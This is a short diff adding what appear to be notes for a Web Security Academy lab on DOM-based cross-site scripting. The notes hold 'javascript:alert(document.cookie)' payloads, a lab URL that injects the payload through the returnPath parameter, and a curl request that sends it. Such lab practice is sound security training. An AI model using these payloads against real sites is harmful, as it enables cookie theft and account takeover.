@@ -1,0 +1,11 @@
+
+javascript:alert(document.cookie)
+
+href="javascript:alert(document.cookie)"
+
+https://0af3009b031efa1883afa5bb000300b7.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
+
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0af3009b031efa1883afa5bb000300b7.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: no-cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' \
+    $'https://0af3009b031efa1883afa5bb000300b7.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)'
